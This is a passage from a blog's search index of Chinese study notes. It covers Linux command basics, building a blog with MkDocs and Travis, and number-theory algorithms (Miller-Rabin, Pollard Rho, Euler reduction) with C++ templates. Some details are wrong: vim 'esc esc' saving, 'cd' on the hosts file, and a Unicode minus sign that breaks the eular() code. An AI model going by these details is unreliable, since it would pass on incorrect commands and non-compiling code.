<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>入门 Linux</title>
    <url>/2021/03/19/Linux-fundamental/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="免密登录"><a href="#免密登录" class="headerlink" title="免密登录"></a>免密登录</h1><ul>
<li><p>配置</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 生成密钥对【在本地上】</span></span><br><span class="line"><span class="comment"># 会在用户目录 .ssh 文件夹下创建公私钥</span></span><br><span class="line">ssh-keygen </span><br><span class="line"></span><br><span class="line"><span class="comment"># 将本地的公钥复制到远程的云主机</span></span><br><span class="line">ssh-copy-id 用户名@ip地址</span><br><span class="line"></span><br><span class="line"><span class="comment"># 公钥信息存储在 .ssh/authorized_keys 文件夹中</span></span><br></pre></td></tr></table></figure></li>
<li><p>hosts 文件：存放 IP 地址和别名，相当于域名解析</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/hosts</span><br></pre></td></tr></table></figure></li>
<li><p><code>!!</code> 表示搜索上一条命令</p>
</li>
<li><p>同名用户：如果 <code>ssh IP地址</code>，则用户名默认填充为本机的用户名</p>
</li>
<li><p>命令别名：<code>alias purple=&quot;ssh 用户名@IP地址&quot;</code> </p>
</li>
<li><p><code>wall</code> 命令 <code>mesd n</code></p>
</li>
<li><p><code>xftp</code> 文件传输软件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 从本地拷贝到远程位置</span></span><br><span class="line">scp 文件名 用户名@主机名:目的位置</span><br><span class="line"><span class="comment"># 从远程位置拷贝文件到本地</span></span><br><span class="line">scp 用户名@主机名:文件名 目的位置</span><br></pre></td></tr></table></figure></li>
<li><p>退出云主机的方式：① exit；② logout；③ ctrl + d</p>
</li>
<li><p>设置 @ 符号后的名字：<code>sudo hostnamectl set-hostname 名字</code></p>
</li>
<li><p>切换到 root 用户：<code>sudo -i</code> 或者 <code>su - root</code></p>
</li>
<li><p>修改密码：<code>passwd</code>（后面加用户，如果不加默认当前用户）</p>
</li>
<li><p>远程和本地文件拷贝：<code>rz</code> 和 <code>sz</code></p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls -c</span><br><span class="line">ls -la</span><br><span class="line">ls -lh</span><br><span class="line"></span><br><span class="line"><span class="comment"># f:find</span></span><br><span class="line">man -f <span class="built_in">print</span></span><br><span class="line"><span class="comment"># 第3章</span></span><br><span class="line">man 3 <span class="built_in">print</span></span><br><span class="line"><span class="comment"># k:关键字</span></span><br><span class="line">man -k <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新软件列表</span></span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install tldr</span><br><span class="line">tldr ls</span><br><span class="line"></span><br><span class="line"><span class="comment"># test 是一个目录，列出目录下的文件</span></span><br><span class="line">ls <span class="built_in">test</span></span><br><span class="line"><span class="comment"># 列出目录的信息</span></span><br><span class="line">ls -dl <span class="built_in">test</span>/</span><br></pre></td></tr></table></figure>
<h1 id="vim-的使用"><a href="#vim-的使用" class="headerlink" title="vim 的使用"></a>vim 的使用</h1><ol>
<li>普通模式</li>
<li>插入模式<ul>
<li><code>i</code>：在光标处插入</li>
<li><code>a</code>：在光标后插入</li>
<li><code>I</code>：在行首进行插入</li>
<li><code>A</code>：在行尾进行插入</li>
<li><code>o</code>：在光标所在的行下面插入一个空行</li>
<li><code>O</code>：在光标所在的行插入一个空行</li>
<li>输入两次 <code>esc</code> 表示对文档进行保存</li>
</ul>
</li>
<li>命令模式：<code>:</code><ul>
<li><code>:set paste</code> 设置粘贴格式</li>
</ul>
</li>
<li>可视模式：<code>V</code>，对文本的列进行操作</li>
</ol>
<p>vim 打开一个文件，编写后，ctrl + z 表示挂起（保存），用 fg 唤醒，回到当前的文件</p>
<hr>
<ul>
<li>uid：root 用户是 0，普通用户从 1000 开始计数</li>
<li>DEB 是 Debian 软件包格式的文件扩展名</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 检测系统占用带宽情况</span></span><br><span class="line">nethogs</span><br><span class="line"><span class="comment"># 交互式的进程浏览器</span></span><br><span class="line">htop</span><br><span class="line"><span class="comment"># 显示所有重要的性能优化信息</span></span><br><span class="line">nmon</span><br><span class="line"><span class="comment"># 全能信息统计工具</span></span><br><span class="line">dstat</span><br></pre></td></tr></table></figure>
<h1 id="Linux-常用命令"><a href="#Linux-常用命令" class="headerlink" title="Linux 常用命令"></a>Linux 常用命令</h1><ul>
<li>文件与目录管理：ls、pwd、</li>
<li>文件内容的修改与查看：cat、less、more</li>
<li>文件的查找与定位：find、which、locate（查找已经有索引的文件 <code>sudo updatedb</code> 和 <code>locate filename</code>）、whereis</li>
<li>用户相关命令：useradd、userdel、usermod、passwd、su、sudo、chgrp、chmod、chown、logout、exit</li>
<li>进程相关命令：ps、kill、pkill、killall、crontab、ctrl+z、fg、bg（&amp; 和 nohup）、jobs</li>
<li>系统信息获取命令：date、df、du、free、top、htop、dstat、nmon、ifconfig、uname、last、who</li>
<li>其他命令：ssh、scp、wget、ping、reboot、poweroff</li>
</ul>
<hr>
<p>腾讯云登录到 root</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 首先设置自定义密码</span></span><br><span class="line">sudo passwd root</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换到 root 用户，输入密码即可</span></span><br><span class="line">su -</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意如果没有配置 ssh，是无法远程登陆 root 的</span></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>MkDocs+Github+Travis搭建博客</title>
    <url>/2020/03/21/MkDocs-Github-Travis/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
<p>最近是不是玩博客玩疯了<br>大概逻辑：通过Travis CI部署的MkDocs环境生成静态页面并且发布到GitHub上<br>能够通过<a href="https://xxx.github.io/">https://xxx.github.io/</a>&lt;仓库名&gt;访问<br>MkDocs 官网</p>
<ol>
<li><a href="https://squidfunk.github.io/mkdocs-material/">https://squidfunk.github.io/mkdocs-material/</a></li>
<li><a href="https://www.mkdocs.org/">https://www.mkdocs.org/</a></li>
</ol>
<p>Travis 官网 <a href="https://travis-ci.org/">https://travis-ci.org</a></p>
</blockquote>
<a id="more"></a>

<h1 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h1><ul>
<li>建立仓库后，<code>git clone</code>仓库到本地</li>
</ul>
<h1 id="MkDocs"><a href="#MkDocs" class="headerlink" title="MkDocs"></a>MkDocs</h1><h2 id="使用简介-最好看文档"><a href="#使用简介-最好看文档" class="headerlink" title="使用简介 [最好看文档]"></a>使用简介 [最好看文档]</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查看python和pip版本</span><br><span class="line">python --version</span><br><span class="line">pip --version</span><br><span class="line"># Installing and verifying MkDocs </span><br><span class="line"># Material requires MkDocs &gt;&#x3D; 1.0.0.</span><br><span class="line">pip install mkdocs &amp;&amp; mkdocs --version</span><br><span class="line"># install material</span><br><span class="line">pip install mkdocs-material</span><br></pre></td></tr></table></figure>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 创建文档库</span><br><span class="line"># xxx是目录名称 会生成docs文件夹和mkdocs.yml</span><br><span class="line">mkdocs new xxx</span><br><span class="line"># 启用服务</span><br><span class="line">mkdocs serve</span><br><span class="line"># 编译构建站点</span><br><span class="line">mkdocs build </span><br></pre></td></tr></table></figure>
<p><strong>至于页面的样式，看文档更改mkdocs.yml文件</strong></p>
<h2 id="部署到Github"><a href="#部署到Github" class="headerlink" title="部署到Github"></a>部署到Github</h2><ul>
<li>将克隆下来的仓库切到<code>master</code>主分支</li>
<li>将上述产生的<code>docs文件夹和mkdocs.yml</code>放入该git目录下</li>
<li>自动编译并发布至<code>Github gh-pages</code>分支<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdocs gh-deploy --clean</span><br><span class="line"># 可以 mkdocs serve 看看是否能够正常显示</span><br></pre></td></tr></table></figure></li>
<li>将本地的仓库同步远程<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git add -A</span><br><span class="line">git push</span><br></pre></td></tr></table></figure></li>
<li>通过<code>https:xxx.github.io/仓库名称</code>访问</li>
</ul>
<h1 id="Travis"><a href="#Travis" class="headerlink" title="Travis"></a>Travis</h1><ul>
<li>持续集成服务 <del>看起来像是监控每一次的提交修改的情况</del></li>
<li><a href="https://flc.io/more/github-travis-mkdocs-document/">直接附上教程</a></li>
</ul>
<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ul>
<li><a href="https://www.jianshu.com/p/b07dc1fd4f9e">使用MKdocs搭建个人博客并发布在Github Pages上</a></li>
<li><a href="https://cloud.tencent.com/developer/article/1468110">基于mkdocs-material搭建个人静态博客</a></li>
</ul>
]]></content>
      <categories>
        <category>Blogs</category>
      </categories>
      <tags>
        <tag>blog</tag>
        <tag>MkDocs</tag>
        <tag>github</tag>
        <tag>Travis</tag>
      </tags>
  </entry>
  <entry>
    <title>Number Theory</title>
    <url>/2020/04/12/Number-Theory/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul>
<li>质数</li>
<li>因子分解</li>
<li>欧拉降幂</li>
<li>RAS</li>
<li>拓展中国剩余定理</li>
</ul>
<a id="more"></a>

<h1 id="质数"><a href="#质数" class="headerlink" title="质数"></a>质数</h1><h2 id="素数间隔-Prime-gap"><a href="#素数间隔-Prime-gap" class="headerlink" title="素数间隔-Prime gap"></a>素数间隔-Prime gap</h2><ul>
<li>The first 60 prime gaps are: 1, 2, 2, 4, 2, 4, 2, 4, 6, 2, 6, 4, 2, 4, 6, 6, 2, 6, 4, 2, 6, 4, 6, 8, 4, 2, 4, 2, 4, 14, 4, 6, 2, 10, 2, 6, 6, 4, 6, 6, 2, 10, 2, 4, 2, 12, 12, 4, 2, 4, 6, 2, 10, 6, 6, 6, 2, 6, 4, 2</li>
<li>有无穷对素数，之间存在着一定的间隔。间隔从被证明为7000万以内，一直到如今的246。如果该常数改进到2，相当于证明孪生素数猜想</li>
<li>素数之间间隔可以有多远，<a href="https://en.wikipedia.org/wiki/Prime_gap">The 80 known maximal prime gaps</a>  </li>
</ul>
<h2 id="素数定理-Prime-Number-Theorem"><a href="#素数定理-Prime-Number-Theorem" class="headerlink" title="素数定理-Prime Number Theorem"></a>素数定理-Prime Number Theorem</h2><ul>
<li><p>质数分布密度，数的总数π(x)近似于x/ln(x)</p>
</li>
<li><p>π(2)=1，π(3.5)=2，π(10)=4</p>
<img src="https://cdn.britannica.com/14/77714-004-D28E8805/Prime-number-theorem.jpg" width=70%></li>
</ul>
<h2 id="素数筛法"><a href="#素数筛法" class="headerlink" title="素数筛法"></a>素数筛法</h2><ul>
<li>求$1$到$n$之间内的所有素数<table>
<thead>
<tr>
<th>方法</th>
<th>时间复杂度</th>
</tr>
</thead>
<tbody><tr>
<td>$sqrt(n)$的判别</td>
<td>$O(n*sqrt(n))$</td>
</tr>
<tr>
<td>普通筛 / 埃氏筛法</td>
<td>$O(nloglogn)$</td>
</tr>
<tr>
<td>线性筛 / 欧拉筛法</td>
<td>$O(n)$</td>
</tr>
</tbody></table>
</li>
</ul>
<h2 id="素数测试-Miller-Rabin"><a href="#素数测试-Miller-Rabin" class="headerlink" title="素数测试-Miller Rabin"></a>素数测试-Miller Rabin</h2><ul>
<li>哥德巴赫猜想：任何大于2的偶数都能够写成两个质数相加的形式</li>
<li>当题目给出的偶数达到$10^{18}$，此时的质数可能非常大，用上述的筛法可能会超时，用Miller Rabin快速判断一个$&lt;2^{63}$的数是不是素数</li>
<li>时间复杂度：$O(klog_2(n))$，$n$为检测的数值，$k$为自己设定的检测的次数</li>
<li>不确定算法，单次测试有不超过$\frac{1}{4}$的概率会将一个合数误判为一个素数</li>
</ul>
<hr>
<ul>
<li><p>依据</p>
<ul>
<li><p>费马小定理：</p>
<p>$若p是质数，则对于任意0&lt;a&lt;p，$</p>
<p>$有a^{p−1}≡1(modp)$</p>
</li>
<li><p>二次探测定理：</p>
<p>$若p是质数，且x^2≡1(modp)，$</p>
<p>$那么x≡1 (modp)和x≡p−1(modp)中有一个成立$</p>
</li>
</ul>
</li>
</ul>
<hr>
<ul>
<li>算法过程<ol>
<li>偶数、0、1、2直接判断</li>
<li>假设要测试的数为$n$，选取整数$r$和奇数$d$，满足$n-1=2^rd$</li>
<li>选取$a \in (1,…,n-1)$</li>
<li>如果$a^d=1(modn)$或者$a^d=n-1(modn)$，即满足二次探测定理，则调回Step 3继续验证</li>
<li>对于$i=0,…,r-1$，验证$a^{2^id}$是否满足$a^{2^id}=n-1(modn)$，满足则跳回Step 3继续验证，不满足则$n$为合数</li>
<li>经过$k$次验证后，$n$可能是素数</li>
</ol>
</li>
</ul>
<hr>
<p>伪码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input #1: n &gt; 3, an odd integer to be tested for primality</span><br><span class="line">Input #2: k, the number of rounds of testing to perform</span><br><span class="line">Output: “composite” if n is found to be composite, “probably prime” otherwise</span><br><span class="line"></span><br><span class="line">write n as 2^r·d + 1 with d odd (by factoring out powers of 2 from n − 1)</span><br><span class="line">WitnessLoop: repeat k times:</span><br><span class="line">pick a random integer a in the range [2, n − 2]</span><br><span class="line">x ← a^d mod n</span><br><span class="line">if x &#x3D; 1 or x &#x3D; n − 1 then</span><br><span class="line">    continue WitnessLoop</span><br><span class="line">repeat r − 1 times:</span><br><span class="line">    x ← x^2 mod n</span><br><span class="line">    if x &#x3D; n − 1 then</span><br><span class="line">        continue WitnessLoop</span><br><span class="line">return “composite”</span><br><span class="line">return “probably prime”</span><br></pre></td></tr></table></figure>
<hr>
<p>模板</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="comment">//typedef long long ll;</span></span><br><span class="line"><span class="comment">//ll*ll可能会溢出，所以乘法化加法</span></span><br><span class="line"><span class="comment">/* *************************************************</span></span><br><span class="line"><span class="comment">* Miller_Rabin 算法进行素数测试</span></span><br><span class="line"><span class="comment">* 速度快可以判断一个 &lt; 2^63 的数是不是素数</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">**************************************************/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> S = <span class="number">8</span>; <span class="comment">//随机算法判定次数一般 8～10 就够了</span></span><br><span class="line"><span class="comment">// 计算 ret = (a*b)%c a,b,c &lt; 2^63</span></span><br><span class="line"><span class="function">ll <span class="title">mult_mod</span><span class="params">(ll a,ll b,ll c)</span></span>&#123;</span><br><span class="line">	a%=c;</span><br><span class="line">	b%=c;</span><br><span class="line">	ll ret=<span class="number">0</span>;</span><br><span class="line">	ll tmp=a;</span><br><span class="line">	<span class="keyword">while</span>(b)&#123;</span><br><span class="line">		<span class="keyword">if</span>(b&amp;<span class="number">1</span>)&#123;</span><br><span class="line">			ret+=tmp;</span><br><span class="line">			<span class="keyword">if</span>(ret&gt;c)ret-=c;<span class="comment">//直接取模慢得多 </span></span><br><span class="line">		&#125;</span><br><span class="line">		tmp&lt;&lt;=<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">if</span>(tmp&gt;c)tmp-=c;</span><br><span class="line">		b&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 计算 ret = (a^n)%mod</span></span><br><span class="line"><span class="function">ll <span class="title">pow_mod</span><span class="params">(ll a,ll n,ll mod)</span></span>&#123;</span><br><span class="line">	ll ret=<span class="number">1</span>;</span><br><span class="line">	ll tmp=a%mod;</span><br><span class="line">	<span class="keyword">while</span>(n)&#123;</span><br><span class="line">		<span class="keyword">if</span>(n&amp;<span class="number">1</span>)ret=mult_mod(ret,tmp,mod);</span><br><span class="line">		tmp=mult_mod(tmp,tmp,mod);</span><br><span class="line">		n&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 通过 a^(n-1)=1(modn)来判断 n 是不是素数</span></span><br><span class="line"><span class="comment">// n - 1 = x * (2^t)</span></span><br><span class="line"><span class="comment">// 中间使用二次判断</span></span><br><span class="line"><span class="comment">// 是合数返回 true, 不一定是合数返回 false</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(ll a,ll n,ll x,ll t)</span></span>&#123;</span><br><span class="line">	ll ret = pow_mod(a,x,n);</span><br><span class="line">	ll last = ret;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= t;i++)&#123;</span><br><span class="line">		ret = mult_mod(ret,ret,n);</span><br><span class="line">		<span class="keyword">if</span>(ret == <span class="number">1</span> &amp;&amp; last != <span class="number">1</span> &amp;&amp; last != n<span class="number">-1</span>)<span class="keyword">return</span> <span class="literal">true</span>;<span class="comment">//合数</span></span><br><span class="line">		last = ret;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(ret != <span class="number">1</span>)<span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 费马小定理</span></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//**************************************************</span></span><br><span class="line"><span class="comment">// Miller_Rabin 算法</span></span><br><span class="line"><span class="comment">// 是素数返回 true,(可能是伪素数)</span></span><br><span class="line"><span class="comment">// 不是素数返回 false</span></span><br><span class="line"><span class="comment">//**************************************************</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Miller_Rabin</span><span class="params">(ll n)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>( n &lt; <span class="number">2</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">if</span>( n == <span class="number">2</span>)<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">if</span>( (n&amp;<span class="number">1</span>) == <span class="number">0</span>)<span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//偶数</span></span><br><span class="line">	ll x = n - <span class="number">1</span>;</span><br><span class="line">	ll t = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>( (x&amp;<span class="number">1</span>)==<span class="number">0</span> )&#123;x &gt;&gt;= <span class="number">1</span>; t++;&#125;</span><br><span class="line">	</span><br><span class="line">	srand(time(<span class="literal">NULL</span>));<span class="comment">/* *************** */</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; S;i++)&#123;</span><br><span class="line">		ll a = rand()%(n<span class="number">-1</span>) + <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">if</span>( check(a,n,x,t) )</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="大数的质因子分解-Pollard-Rho"><a href="#大数的质因子分解-Pollard-Rho" class="headerlink" title="大数的质因子分解-Pollard Rho"></a>大数的质因子分解-Pollard Rho</h2><ul>
<li>$O(n^{\frac{1}{4}})$的期望时间复杂度内计算合数$n$的某个非平凡因子(平凡因子指$1$和$n$，非平凡因子指$x \in [2,n-1]，n mod x=0$)</li>
<li>试除法：$n$的因数对称分布，遍历区间$[1,\sqrt N]$，时间复杂度为$O(\sqrt N)$</li>
<li>不直接寻找因子，而是寻找因子的倍数，然后通过GCD找到因子本身</li>
</ul>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol>
<li>对于$N⩾10^{18}$，使用<strong>随机算法</strong>-猜因数</li>
<li>组合随机采样-生日悖论：满足答案的组合比单个个体要多一些。假如一个班上有$k$个人，如果找到一个人的生日是x月x日，这个概率会相当低；如果想找两个生日相同，当$k=23$，两个人在同一天生日的概率至少有$50%$，$k=60$时，生日有重复的现象的概率$\text{P}(k) ≈0.9999$</li>
</ol>
<hr>
<ol start="3">
<li>最大公约数一定是某个数的约数。通过选择适当的$k$使得$\gcd(k,n)&gt;1$，则求得的$\gcd(k,n)$是$n$的约数。则选取一组数$x_1,x_2,x_3,…x_n$，若有$gcd(|x_i-x_j|,n)&gt;1$，则称$gcd(|x_i-x_j|,n)$是$n$的一个因子</li>
<li>构造一个<strong>伪随机数序列</strong>，然后取相邻的两项来求gcd。Pollard设计了一个函数: $f(x)=(x^2+c)\mod N$ 其中c是一个随机的常数。选取$x_1$，令$x_2=f(x_1),x_3=f(x_2),…,x_i=f(x_{i-1})$</li>
</ol>
<hr>
<ol start="5">
<li>Floyd判圈：在一定范围内，这个数列是随机的；但也有死循环的情况。龟兔赛跑：兔子比乌龟快一倍，同起点同时开始，当兔子“追上”乌龟时，兔子一定跑了刚好一圈。</li>
</ol>
  <img src="https://img-blog.csdn.net/20150503163841553" width=30%>

<ol start="6">
<li><a href="https://www.cnblogs.com/book-book/p/6349362.html">brent判环(更高效)</a></li>
</ol>
<hr>
<p>kuangbin的模板</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//**************************************************</span></span><br><span class="line"><span class="comment">// Miller_Rabin 算法</span></span><br><span class="line"><span class="comment">// 是素数返回 true,(可能是伪素数)</span></span><br><span class="line"><span class="comment">// 不是素数返回 false</span></span><br><span class="line"><span class="comment">//**************************************************</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Miller_Rabin</span><span class="params">(ll n)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>( n &lt; <span class="number">2</span>)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">if</span>( n == <span class="number">2</span>)<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">if</span>( (n&amp;<span class="number">1</span>) == <span class="number">0</span>)<span class="keyword">return</span> <span class="literal">false</span>;<span class="comment">//偶数</span></span><br><span class="line">	ll x = n - <span class="number">1</span>;</span><br><span class="line">	ll t = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>( (x&amp;<span class="number">1</span>)==<span class="number">0</span> )&#123;x &gt;&gt;= <span class="number">1</span>; t++;&#125;</span><br><span class="line">	</span><br><span class="line">	srand(time(<span class="literal">NULL</span>));<span class="comment">/* *************** */</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; S;i++)&#123;</span><br><span class="line">		ll a = rand()%(n<span class="number">-1</span>) + <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">if</span>( check(a,n,x,t) )</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//**********************************************</span></span><br><span class="line"><span class="comment">// pollard_rho 算法进行质因素分解</span></span><br><span class="line"><span class="comment">//*********************************************</span></span><br><span class="line">ll factor[<span class="number">100</span>];<span class="comment">//质因素分解结果（刚返回时时无序的）</span></span><br><span class="line"><span class="keyword">int</span> tol;<span class="comment">//质因素的个数，编号 0～tol-1</span></span><br><span class="line"><span class="function">ll <span class="title">gcd</span><span class="params">(ll a,ll b)</span></span>&#123;</span><br><span class="line">	ll t;</span><br><span class="line">	<span class="keyword">while</span>(b)&#123;</span><br><span class="line">		t = a;</span><br><span class="line">		a = b;</span><br><span class="line">		b = t%b;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(a &gt;= <span class="number">0</span>)<span class="keyword">return</span> a;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> -a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//找出一个因子</span></span><br><span class="line"><span class="function">ll <span class="title">pollard_rho</span><span class="params">(ll x,ll c)</span></span>&#123;</span><br><span class="line">	ll i = <span class="number">1</span>, k = <span class="number">2</span>;</span><br><span class="line">	srand(time(<span class="literal">NULL</span>));</span><br><span class="line">	ll x0 = rand()%(x<span class="number">-1</span>) + <span class="number">1</span>;</span><br><span class="line">	ll y = x0;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		i++;</span><br><span class="line">		x0 = (mult_mod(x0,x0,x) + c)%x;<span class="comment">//不断调整x2 </span></span><br><span class="line">		ll d = gcd(y - x0,x);</span><br><span class="line">		<span class="keyword">if</span>( d != <span class="number">1</span> &amp;&amp; d != x)<span class="keyword">return</span> d;<span class="comment">//找到因子，返回 </span></span><br><span class="line">		<span class="keyword">if</span>(y == x0)<span class="keyword">return</span> x;<span class="comment">//判圈 出现循环，返回 </span></span><br><span class="line">		<span class="keyword">if</span>(i == k)&#123;y = x0; k += k;&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 对 n 进行素因子分解，存入 factor. k 设置为 107 左右即可</span></span><br><span class="line"><span class="comment">// 如果n 本身就是素数，那么将 n 存放在 factor 便可结束并返回</span></span><br><span class="line"><span class="comment">// 如果 n 不是素数，那么通过 pollard_rho()函数 找到 n 的一个因子 p(不一定是素因子)，递归 findFac(p)和 findFac(n/p)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">findfac</span><span class="params">(ll n,<span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(n == <span class="number">1</span>)<span class="keyword">return</span>;<span class="comment">//递归出口 </span></span><br><span class="line">	<span class="keyword">if</span>(Miller_Rabin(n))</span><br><span class="line">	&#123;</span><br><span class="line">		factor[tol++] = n;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	ll p = n;</span><br><span class="line">	<span class="keyword">int</span> c = k;</span><br><span class="line">	<span class="comment">//值变化，防止死循环</span></span><br><span class="line">	<span class="keyword">while</span>( p &gt;= n) <span class="comment">// 改变常数c，不断找因子，返回n说明没找到 </span></span><br><span class="line">		p = pollard_rho(p,c--);</span><br><span class="line">	findfac(p,k);</span><br><span class="line">	findfac(n/p,k);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://www.luogu.com.cn/problem/P4718">洛谷 P4718【模板】Pollard-Rho算法</a> </p>
<ul>
<li>TLE的原因</li>
</ul>
<h1 id="欧拉降幂"><a href="#欧拉降幂" class="headerlink" title="欧拉降幂"></a>欧拉降幂</h1><hr>
<p>给三个正整数，$a,m,b$，需要求：$a^b mod m$</p>
<p>$1\le a \le 10^9，1\le b \le 10^{20000000}，1\le m \le 10^8$</p>
<p><strong>指数爆炸</strong></p>
<hr>
<ul>
<li><p>欧拉定理：$a^{\varphi(p)}≡1 \ mod \ p，a和p互质$</p>
</li>
<li><p>拓展欧拉降幂</p>
<p>$a^b\equiv \begin{cases} a^{b\bmod\varphi(p)},&amp;\gcd(a,p)=1\ a^b,&amp;\gcd(a,p)\ne1,b&lt;\varphi(p)\ a^{b\bmod\varphi(p)+\varphi(p)},&amp;\gcd(a,p)\ne1,b\ge\varphi(p) \end{cases} \pmod p$</p>
</li>
<li><p>假设$k=\frac{b}{\varphi(p)},h=bmod\varphi(p)$，则$a^b=a^{k<em>\varphi(p)+h}=(a^{\varphi(p)})^k</em>a^h=a^h(modp)$</p>
</li>
<li><p><a href="https://blog.csdn.net/weixin_38686780/article/details/81272848">欧拉降幂公式的证明</a></p>
</li>
</ul>
<hr>
<p>求单个数的欧拉函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">eular</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans = n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>;i*i &lt;= n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(n % i == <span class="number">0</span>)&#123;</span><br><span class="line">            ans -= ans/i;</span><br><span class="line">            <span class="keyword">while</span>(n % i == <span class="number">0</span>)n /= i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(n &gt; <span class="number">1</span>)ans −= ans/n;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<ul>
<li>拓展欧拉函数<ul>
